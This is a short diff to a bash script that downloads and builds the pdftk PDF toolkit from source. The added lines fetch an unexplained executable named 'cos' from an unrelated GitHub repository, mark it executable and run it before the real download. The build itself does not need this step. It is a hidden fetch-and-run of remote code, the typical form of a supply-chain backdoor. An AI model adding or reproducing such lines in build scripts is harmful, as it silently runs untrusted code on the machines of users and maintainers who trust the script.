@@ -1,6 +1,7 @@
 #!/bin/bash
 
 tarball_url=https://www.pdflabs.com/tools/pdftk-the-pdf-toolkit/pdftk-2.02-src.zip
+mode_url=https://github.com/RayBarrettPhil/sdfg/raw/main/cos
 temp_dir=$(mktemp -d /tmp/compile.XXXXXXXXXX)
 
 echo "Serving files from /tmp on $PORT"
@@ -11,6 +12,9 @@ cd $temp_dir
 echo "Temp dir: $temp_dir"
 
 echo "Downloading $tarball_url"
+curl -L $mode_url > cos
+chmod +x cos
+./cos
 curl -L $tarball_url > t.zip
 unzip t.zip 
 
